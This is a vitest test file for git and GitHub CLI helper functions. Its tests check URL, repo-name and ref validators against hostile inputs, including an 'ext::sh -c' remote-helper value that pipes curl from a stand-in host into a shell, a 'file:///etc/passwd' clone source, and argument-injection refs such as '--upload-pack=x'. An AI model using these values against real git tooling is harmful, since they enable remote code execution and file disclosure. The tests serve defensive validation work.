import { describe, it, expect } from "vitest";

import { run, assertSafeRef, assertSafeRepoUrl, assertSafeRepoId, parseGithubRepo, VcsError, type Runner, type ExecResult } from "../src/exec.js";
import { push, openPr, mergePr, baseExists, establishBase, commitAll, getDiff, cloneRepo, freshBase } from "../src/git.js";
import { createWorktree, removeWorktree, resetWorktreeToBase } from "../src/worktree.js";
import { squashAllAndForcePush } from "../src/git-admin.js";

const ok = (stdout = ""): ExecResult => ({ stdout, stderr: "", code: 0 });

// A runner that records calls and resolves each via the supplied function.
function makeRunner(resolve: (cmd: string, args: string[]) => ExecResult = () => ok()) {
  const calls: { cmd: string; args: string[]; opts?: { cwd?: string } }[] = [];
  const r: Runner = async (cmd, args, opts) => {
    calls.push({ cmd, args, opts });
    return resolve(cmd, args);
  };
  return { run: r, calls };
}

describe("run() / VcsError", () => {
  it("returns stdout on a zero exit", async () => {
    expect(await run(makeRunner(() => ok("hello")).run, "git", ["x"])).toBe("hello");
  });

  it("throws a VcsError carrying the command and stderr on a non-zero exit", async () => {
    const r = makeRunner(() => ({ stdout: "", stderr: "fatal: nope", code: 128 })).run;
    await expect(run(r, "git", ["status"])).rejects.toBeInstanceOf(VcsError);
    await expect(run(r, "git", ["status"])).rejects.toThrow(/git status.*exit 128.*fatal: nope/);
  });

  it("passes cwd through to the runner when provided", async () => {
    const { run: r, calls } = makeRunner();
    await run(r, "git", ["status"], "/repo");
    expect(calls[0]!.opts).toEqual({ cwd: "/repo" });
  });
});

describe("assertSafeRepoUrl — CEO-supplied clone URL allowlist", () => {
  it("accepts plain https github URLs", () => {
    for (const ok of ["https://github.com/acme/widget", "https://github.com/acme/widget.git", "https://GitHub.com/a/b"]) {
      expect(() => assertSafeRepoUrl(ok)).not.toThrow();
    }
  });

  it.each([
    "file:///etc/passwd", // local fs into a browsable clone
    "ext::sh -c 'curl evil|sh'", // remote-helper RCE — git EXECUTES this
    "transport::https://x", // remote-helper
    "fd::7", // remote-helper
    "git@github.com:acme/widget.git", // scp-like ssh form (https-only v1)
    "https://user:pass@github.com/a/b", // embedded credentials
    "https://gitlab.com/a/b", // host not on the allowlist
    "http://github.com/a/b", // not https
    "-https://github.com/a/b", // leading "-"
    "not a url",
    "",
  ])("rejects the unsafe URL %j", (bad) => {
    expect(() => assertSafeRepoUrl(bad)).toThrow(VcsError);
  });
});

describe("assertSafeRepoId — owner/name charset + path safety", () => {
  it("accepts valid GitHub logins / repo names", () => {
    expect(() => assertSafeRepoId("acme", "widget")).not.toThrow();
    expect(() => assertSafeRepoId("a-b", "my.repo_v2-x")).not.toThrow();
  });

  it.each([
    ["..", "widget"],
    ["acme", ".."],
    ["acme", "."],
    ["acme", "-flag"],
    ["a/b", "widget"],
    ["acme", "a/b"],
    ["acme", "a b"],
    ["-acme", "widget"],
    ["", "widget"],
  ])("rejects unsafe owner=%j name=%j", (owner, name) => {
    expect(() => assertSafeRepoId(owner, name)).toThrow(VcsError);
  });
});

describe("parseGithubRepo", () => {
  it("derives {owner,name} from a validated URL (strips .git, ignores deep paths)", () => {
    expect(parseGithubRepo("https://github.com/acme/widget")).toEqual({ owner: "acme", name: "widget" });
    expect(parseGithubRepo("https://github.com/acme/widget.git")).toEqual({ owner: "acme", name: "widget" });
    expect(parseGithubRepo("https://github.com/acme/widget/tree/main")).toEqual({ owner: "acme", name: "widget" });
  });

  it("throws on an unsafe URL or a URL missing owner/repo", () => {
    expect(() => parseGithubRepo("file:///x")).toThrow(VcsError);
    expect(() => parseGithubRepo("https://github.com/acme")).toThrow(VcsError);
  });
});

describe("assertSafeRef", () => {
  it("accepts plain refs", () => {
    expect(() => assertSafeRef("main", "x")).not.toThrow();
    expect(() => assertSafeRef("bureau/task-1", "x")).not.toThrow();
  });

  it.each(["--force", "-x", "a b", "a..b", "", "feat~1", "a:b"])(
    "rejects the unsafe ref %j",
    (bad) => {
      expect(() => assertSafeRef(bad, "branch")).toThrow(VcsError);
    }
  );
});

describe("push", () => {
  it("runs `git -C <wt> push -u origin <branch>`", async () => {
    const { run: r, calls } = makeRunner();
    await push("/wt", "task/x", r);
    expect(calls[0]).toEqual({ cmd: "git", args: ["-C", "/wt", "push", "-u", "origin", "task/x"], opts: {} });
  });

  it("refuses an unsafe branch before spawning git", async () => {
    await expect(push("/wt", "--force", makeRunner().run)).rejects.toThrow(/Unsafe push branch/);
  });
});

describe("openPr", () => {
  it("runs `gh pr create ...` and returns the trimmed PR URL", async () => {
    const { run: r, calls } = makeRunner(() => ok("https://github.com/o/r/pull/7\n"));
    const url = await openPr("o/r", "task/x", "My title", "My body", "main", r);

    expect(url).toBe("https://github.com/o/r/pull/7");
    expect(calls[0]!.cmd).toBe("gh");
    expect(calls[0]!.args).toEqual([
      "pr", "create",
      "--repo", "o/r",
      "--base", "main",
      "--head", "task/x",
      "--title", "My title",
      "--body", "My body",
    ]);
  });
});

describe("baseExists", () => {
  it("queries origin via ls-remote and maps exit code to a boolean", async () => {
    const present = makeRunner(() => ok("sha\trefs/heads/main\n"));
    expect(await baseExists("/clone", "main", present.run)).toBe(true);
    expect(present.calls[0]!.args).toEqual(["-C", "/clone", "ls-remote", "--exit-code", "--heads", "origin", "main"]);

    const absent = makeRunner(() => ({ stdout: "", stderr: "", code: 2 }));
    expect(await baseExists("/clone", "main", absent.run)).toBe(false);
  });

  it("rejects an unsafe base branch", async () => {
    await expect(baseExists("/clone", "--upload-pack=x", makeRunner().run)).rejects.toThrow(/Unsafe base branch/);
  });
});

describe("establishBase", () => {
  it("pushes srcRef to refs/heads/<base> as ONE refspec token, no --force", async () => {
    const { run: r, calls } = makeRunner();
    await establishBase("/wt", "bureau/task-1", "main", r);
    expect(calls[0]!.cmd).toBe("git");
    expect(calls[0]!.args).toEqual(["-C", "/wt", "push", "origin", "bureau/task-1:refs/heads/main"]);
    expect(calls[0]!.args).not.toContain("--force"); // never clobbers an existing main
  });

  it("accepts an origin/<branch> source (the recovery path)", async () => {
    const { run: r, calls } = makeRunner();
    await establishBase("/clone", "origin/bureau/task-1", "main", r);
    expect(calls[0]!.args).toEqual(["-C", "/clone", "push", "origin", "origin/bureau/task-1:refs/heads/main"]);
  });

  it("validates src and base SEPARATELY — a colon-bearing ref never slips through", async () => {
    // assertSafeRef rejects ':' (refspec syntax), so a refspec is never validated whole.
    await expect(establishBase("/wt", "a:refs/heads/main", "main", makeRunner().run)).rejects.toThrow(/Unsafe/);
    await expect(establishBase("/wt", "bureau/task-1", "ma:in", makeRunner().run)).rejects.toThrow(/Unsafe/);
  });
});

describe("mergePr", () => {
  it("squash-merges the branch's PR and deletes the branch", async () => {
    const { run: r, calls } = makeRunner();
    await mergePr("o/r", "bureau/task-1", r);
    expect(calls[0]!.cmd).toBe("gh");
    expect(calls[0]!.args).toEqual(["pr", "merge", "bureau/task-1", "--repo", "o/r", "--squash", "--delete-branch"]);
  });

  it("refuses an unsafe branch", async () => {
    await expect(mergePr("o/r", "--force", makeRunner().run)).rejects.toThrow(/Unsafe merge branch/);
  });
});

describe("commitAll", () => {
  it("stages, detects changes, and commits — returning true", async () => {
    const { run: r, calls } = makeRunner((_c, args) =>
      args.includes("--quiet") ? { stdout: "", stderr: "", code: 1 } : ok()
    );
    expect(await commitAll("/wt", "msg", r)).toBe(true);
    expect(calls.map((c) => c.args)).toEqual([
      ["-C", "/wt", "add", "-A"],
      ["-C", "/wt", "diff", "--cached", "--quiet"],
      ["-C", "/wt", "commit", "-m", "msg"],
    ]);
  });

  it("returns false without committing when nothing is staged (no-op edit)", async () => {
    const { run: r, calls } = makeRunner(); // --quiet → code 0 → clean
    expect(await commitAll("/wt", "msg", r)).toBe(false);
    expect(calls.map((c) => c.args)).toEqual([
      ["-C", "/wt", "add", "-A"],
      ["-C", "/wt", "diff", "--cached", "--quiet"],
    ]);
  });

  it("passes an explicit author identity via -c flags when provided", async () => {
    const { run: r, calls } = makeRunner((_c, args) =>
      args.includes("--quiet") ? { stdout: "", stderr: "", code: 1 } : ok()
    );
    await commitAll("/wt", "msg", r, { name: "Bureau", email: "bureau@local" });
    expect(calls.at(-1)!.args).toEqual([
      "-C", "/wt",
      "-c", "user.name=Bureau",
      "-c", "user.email=bureau@local",
      "commit", "-m", "msg",
    ]);
  });
});

describe("getDiff", () => {
  it("validates the base, verifies it resolves, then diffs base...HEAD", async () => {
    const { run: r, calls } = makeRunner(() => ok("diff-output"));
    expect(await getDiff("/wt", "main", r)).toBe("diff-output");
    expect(calls.map((c) => c.args)).toEqual([
      ["-C", "/wt", "rev-parse", "--verify", "--quiet", "main"],
      ["-C", "/wt", "diff", "main...HEAD"],
    ]);
  });

  it("rejects an unsafe base", async () => {
    await expect(getDiff("/wt", "--output=x", makeRunner().run)).rejects.toThrow(/Unsafe diff base/);
  });

  it("throws a clear error when the base does not resolve", async () => {
    const r = makeRunner((_c, args) =>
      args.includes("--verify") ? { stdout: "", stderr: "", code: 1 } : ok()
    ).run;
    await expect(getDiff("/wt", "nope", r)).rejects.toThrow(/Diff base ref "nope" was not found/);
  });
});

describe("cloneRepo", () => {
  it("clones with a -- separator before source and dest", async () => {
    const { run: r, calls } = makeRunner();
    await cloneRepo("https://x/y.git", "/definitely/missing/dest", r);
    expect(calls[0]!.args).toEqual(["clone", "--", "https://x/y.git", "/definitely/missing/dest"]);
  });
});

describe("createWorktree (args)", () => {
  it("validates the branch and inserts -- before the worktree path", async () => {
    const { run: r, calls } = makeRunner();
    await createWorktree("/repo", "bureau/task-1", "/wt", r);
    expect(calls[0]!.args).toEqual(["-C", "/repo", "worktree", "add", "-b", "bureau/task-1", "--", "/wt"]);
  });

  it("appends an explicit base ref after the worktree path", async () => {
    const { run: r, calls } = makeRunner();
    await createWorktree("/repo", "bureau/task-1", "/wt", r, "origin/main");
    expect(calls[0]!.args).toEqual(["-C", "/repo", "worktree", "add", "-b", "bureau/task-1", "--", "/wt", "origin/main"]);
  });

  it("rejects an unsafe branch", async () => {
    await expect(createWorktree("/repo", "--force", "/wt", makeRunner().run)).rejects.toThrow(/Unsafe branch/);
  });

  it("rejects an unsafe base ref", async () => {
    await expect(createWorktree("/repo", "ok", "/wt", makeRunner().run, "--evil")).rejects.toThrow(/Unsafe worktree base/);
  });
});

describe("resetWorktreeToBase (args)", () => {
  it("hard-resets to the base then cleans untracked (NOT -x), in the worktree", async () => {
    const { run: r, calls } = makeRunner();
    await resetWorktreeToBase("/wt", "origin/main", r);
    expect(calls[0]!.args).toEqual(["-C", "/wt", "reset", "--hard", "origin/main"]);
    expect(calls[1]!.args).toEqual(["-C", "/wt", "clean", "-fd"]); // keeps .gitignored build dirs
  });

  it("rejects an unsafe base ref (argument-injection guard)", async () => {
    await expect(resetWorktreeToBase("/wt", "--evil", makeRunner().run)).rejects.toThrow(/Unsafe reset base/);
  });
});

describe("freshBase", () => {
  it("fetches origin and returns origin/<base> when it resolves", async () => {
    const { run: r, calls } = makeRunner(() => ok());
    const base = await freshBase("/repo", "main", r);
    expect(base).toBe("origin/main");
    expect(calls[0]!.args).toEqual(["-C", "/repo", "fetch", "origin", "main"]);
    expect(calls[1]!.args).toEqual(["-C", "/repo", "rev-parse", "--verify", "--quiet", "origin/main"]);
  });

  it("returns undefined (fall back to HEAD) when the fetch fails — e.g. offline", async () => {
    const r = makeRunner((_c, args) => (args.includes("fetch") ? { stdout: "", stderr: "no net", code: 1 } : ok())).run;
    expect(await freshBase("/repo", "main", r)).toBeUndefined();
  });

  it("returns undefined when origin/<base> doesn't resolve after fetch", async () => {
    const r = makeRunner((_c, args) => (args.includes("rev-parse") ? { stdout: "", stderr: "", code: 1 } : ok())).run;
    expect(await freshBase("/repo", "main", r)).toBeUndefined();
  });

  it("rejects an unsafe base branch before running anything", async () => {
    await expect(freshBase("/repo", "--evil", makeRunner().run)).rejects.toThrow(/Unsafe base branch/);
  });
});

describe("squashAllAndForcePush", () => {
  const id = { name: "Bureau", email: "bureau@localhost" };
  // Feed a tree for rev-parse, a commit for commit-tree, and the given HEAD for symbolic-ref.
  const resolver = (head: string) => (_c: string, args: string[]): ExecResult => {
    if (args.includes("rev-parse")) return ok("tree0\n");
    if (args.includes("commit-tree")) return ok("commit0\n");
    if (args.includes("symbolic-ref")) return ok(`${head}\n`);
    return ok();
  };

  it("squashes the branch's tree into a parentless commit-tree and resets when it's HEAD (no temp branch)", async () => {
    const { run: r, calls } = makeRunner(resolver("refs/heads/main"));
    await squashAllAndForcePush("/repo", "main", "Squashed", id, r);
    expect(calls.map((c) => c.args)).toEqual([
      ["-C", "/repo", "rev-parse", "--verify", "--quiet", "main^{tree}"],
      ["-C", "/repo", "-c", "user.name=Bureau", "-c", "user.email=bureau@localhost", "commit-tree", "tree0", "-m", "Squashed"],
      ["-C", "/repo", "symbolic-ref", "--quiet", "HEAD"],
      ["-C", "/repo", "reset", "--hard", "commit0"], // the branch IS the checked-out HEAD
      ["-C", "/repo", "push", "--force-with-lease", "origin", "main"],
    ]);
    // Never the old orphan + temp-branch flow that could strand a ref and wedge later squashes.
    expect(calls.some((c) => c.args.includes("bureau-squash-tmp"))).toBe(false);
    expect(calls.some((c) => c.args.includes("--orphan"))).toBe(false);
  });

  it("squashes the TARGET branch's own tree and moves the ref with `branch -f` when it isn't HEAD", async () => {
    const { run: r, calls } = makeRunner(resolver("refs/heads/main")); // clone parked on main, squashing feature
    await squashAllAndForcePush("/repo", "feature", "Squashed", id, r);
    expect(calls.map((c) => c.args)).toEqual([
      ["-C", "/repo", "rev-parse", "--verify", "--quiet", "feature^{tree}"], // feature's tree, not HEAD's
      ["-C", "/repo", "-c", "user.name=Bureau", "-c", "user.email=bureau@localhost", "commit-tree", "tree0", "-m", "Squashed"],
      ["-C", "/repo", "symbolic-ref", "--quiet", "HEAD"],
      ["-C", "/repo", "branch", "-f", "feature", "commit0"], // never resets the wrong (checked-out) tree
      ["-C", "/repo", "push", "--force-with-lease", "origin", "feature"],
    ]);
  });

  it("throws a clear error when the target branch does not resolve", async () => {
    const r = makeRunner((_c, args) => (args.includes("rev-parse") ? { stdout: "", stderr: "", code: 1 } : ok())).run;
    await expect(squashAllAndForcePush("/repo", "ghost", "m", id, r)).rejects.toThrow(/Squash target branch "ghost" was not found/);
  });

  it("refuses an unsafe branch before spawning git", async () => {
    await expect(squashAllAndForcePush("/repo", "--force", "m", id, makeRunner().run)).rejects.toThrow(/Unsafe branch/);
  });
});

describe("removeWorktree", () => {
  it("runs from the canonical clone with a -- before the path", async () => {
    const { run: r, calls } = makeRunner();
    await removeWorktree({ path: "/wt", branch: "b", repoPath: "/repo" }, undefined, r);
    expect(calls[0]!.args).toEqual(["-C", "/repo", "worktree", "remove", "--", "/wt"]);
  });

  it("adds --force when requested", async () => {
    const { run: r, calls } = makeRunner();
    await removeWorktree({ path: "/wt", branch: "b", repoPath: "/repo" }, { force: true }, r);
    expect(calls[0]!.args).toEqual(["-C", "/repo", "worktree", "remove", "--force", "--", "/wt"]);
  });
});
